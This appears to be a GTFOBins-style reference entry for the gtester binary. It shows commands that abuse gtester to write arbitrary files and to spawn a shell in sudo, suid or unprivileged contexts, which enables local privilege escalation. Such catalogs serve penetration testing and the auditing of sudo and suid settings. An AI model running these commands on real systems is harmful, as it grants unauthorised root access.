title: gtester
html:
gtester

File Write

Context: sudo, suid, unprivileged

gtester DATA -o /path/to/output-file

Shell

Context: sudo, suid, unprivileged

echo 'exec /bin/sh 0<&1' >/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file
excerpt: gtester File Write Context: sudo, suid, unprivileged gtester DATA -o /path/to/output-file Shell Context: sudo, suid, unprivileged echo 'exec /bin/sh 0<&1' >/path/to/temp-file chmod
